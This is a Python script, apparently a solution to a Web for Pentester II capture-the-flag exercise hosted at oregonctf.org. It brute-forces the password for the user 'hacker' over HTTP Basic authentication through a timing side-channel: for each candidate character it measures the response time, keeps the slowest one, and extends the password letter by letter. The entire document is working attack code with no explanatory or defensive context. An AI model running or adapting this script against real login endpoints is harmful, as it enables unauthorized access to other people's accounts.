from requests.auth import HTTPBasicAuth
import requests
import string
import time


alphaNumeric = "0123456789" + string.ascii_uppercase + string.ascii_lowercase



def main():
    password = ""
    while True:
        letter = bruteForce(password)
        password = password + letter
        print(password)
        r = requests.get('http://wfp2.oregonctf.org/authentication/example2/',
                    auth=HTTPBasicAuth('hacker', password))
        print(r.text)

def bruteForce(word):
    longestReponseTime = (0, '')
    for letter in alphaNumeric:
        password = word + letter
        requests.get('http://wfp2.oregonctf.org/authentication/example2/',
                    auth=HTTPBasicAuth('', ''))
        requests.get('http://wfp2.oregonctf.org/authentication/example2/',
                    auth=HTTPBasicAuth('', ''))
        responseTime = requests.get('http://wfp2.oregonctf.org/authentication/example2/',
                    auth=HTTPBasicAuth('hacker', password)).elapsed.total_seconds()
        requests.get('http://wfp2.oregonctf.org/authentication/example2/',
                    auth=HTTPBasicAuth('', ''))
        print(password, responseTime)
        if longestReponseTime[0] < responseTime:
            longestReponseTime = (responseTime, letter)
    return longestReponseTime[1]


if __name__ == "__main__":
    main()
